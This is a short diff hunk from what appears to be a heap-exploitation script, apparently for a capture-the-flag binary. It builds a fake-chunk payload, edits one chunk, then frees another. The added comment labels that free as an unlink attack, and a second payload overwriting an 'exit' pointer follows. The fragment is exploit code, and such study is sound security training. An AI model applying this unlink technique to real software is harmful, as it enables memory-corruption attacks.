@@ -38,7 +38,7 @@ payload += p64(0x110) # inuse 0
 pause()
 edit(2, 0x130, payload)
 pause()
-free(3)
+free(3)		# unlink!
 pause()
 payload = p64(0)
 payload += p64(exit) # ptr 0
